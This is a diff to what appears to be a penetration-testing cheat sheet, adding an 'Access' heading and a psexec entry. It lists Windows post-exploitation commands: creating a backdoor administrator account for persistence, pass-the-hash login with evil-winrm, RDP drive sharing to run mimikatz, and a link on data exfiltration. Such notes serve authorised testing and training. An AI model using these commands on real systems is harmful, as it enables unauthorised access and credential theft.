@@ -179,10 +179,12 @@ Need to change /etc/proxychains4.conf socks4 to socks5 on attack box
  # Persistence
      net user USERNAME PASSWORD /add
      net localgroup Administrators USERNAME /add
-     net localgroup "Remote Management Users" USERNAME /add  
+     net localgroup "Remote Management Users" USERNAME /add    
+ ## Access  
      pass the hash: evil-winrm -u Administrator -H ADMIN_HASH -i IP  
      xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share   
-     \\tsclient\share\mimikatz\x64\mimikatz.exe 
+     \\tsclient\share\mimikatz\x64\mimikatz.exe   
+     psexec 
  ____ 
  # Post Exploitation / Exfiltration 
  [Data Exfiltration Techniques](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)    
